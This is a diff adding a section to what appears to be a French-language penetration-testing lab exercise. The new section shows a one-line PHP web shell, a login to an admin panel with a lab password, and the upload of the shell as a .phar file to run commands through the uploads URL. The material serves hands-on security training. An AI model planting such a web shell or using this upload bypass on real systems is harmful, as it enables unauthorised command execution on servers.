@@ -129,3 +129,24 @@ Listing all containers :
 300 stopped attackerT
 301 stopped attackerT
 ```
+## Exécution d’un script `myshell.php` sur `pentester-03` [3 pts]**
+    1. Tester depuis le navigateur de l’étudiant *`http://pentester-03/admin/uploads/myshell.phar?cmd=ls`*
+        
+        <?php  
+           system($_GET['cmd']);
+        ?>
+```
+lynx http://10.10.111.169/
+go to > Admin
+type : y
+Login : admin
+Password : P4ssw0rd
+go on > add
+Title : myshell.PHP
+File : myshell.phar
+click on > add
+CRTL + C to quit lynx
+```
+```
+lynx http://10.10.111.169/admin/uploads/myshell.phar?cmd=ls
+```
